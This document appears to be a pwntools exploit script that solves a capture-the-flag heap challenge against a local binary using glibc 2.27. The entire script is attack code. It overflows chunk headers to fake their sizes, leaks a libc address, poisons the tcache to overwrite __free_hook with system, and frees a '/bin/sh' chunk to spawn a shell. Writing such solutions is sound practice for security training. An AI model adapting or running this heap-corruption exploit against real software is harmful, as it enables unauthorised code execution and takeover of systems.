from pwn import *
import sys

if len(sys.argv) < 2:
    debug = True
else:
    debug = False

if debug:
    p = process("./chall")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./chall")
else:
    pass

def menu(choice):
    p.sendlineafter("> ",str(choice))

def add(name):
    menu(1)
    p.sendafter("Name: ",name)

def show(index):
    menu(2)
    p.sendlineafter("> ",str(index))

def free(index):
    menu(3)
    p.sendlineafter("> ",str(index))

def debugf():
    if debug:
        gdb.attach(p,"b *0x0000000000400BBB\nb *0x400AD8")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
size = 0x78
add("a" * (size - 1))
payload = "a" * (size - 0x10) + p64(0x21) + p64(0) + "a"
for i in range(8):
    add(payload)
#debugf()
payload = "a" * 0x78 + p64(0x90 * 8 + 1)[:7]
add(payload)
free(0)
add("a" * 0x78) #9
free(3)
add("a" * 0x1e + "\x00") #9
free(1)
add("a" * (size + 1))
free(1)
add("a" * (size + 1))
show(2)
leak_addr = u64(p.recvuntil(":",drop = True).ljust(0x8,"\x00"))
libc.address = leak_addr - 96 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
free(3)
add("a" * (size + 1))
#debugf()
free(3)
free(4)
free(5)
free(2)
free(3)
add("a" * 7)
target = libc.symbols["__free_hook"]
add(p64(target).ljust(0x79,"\x00"))
debugf()
add("/bin/sh".ljust(0x79,"\x00"))
add(p64(libc.symbols["system"]).ljust(0x79,"\x00"))
free(6)
p.interactive()
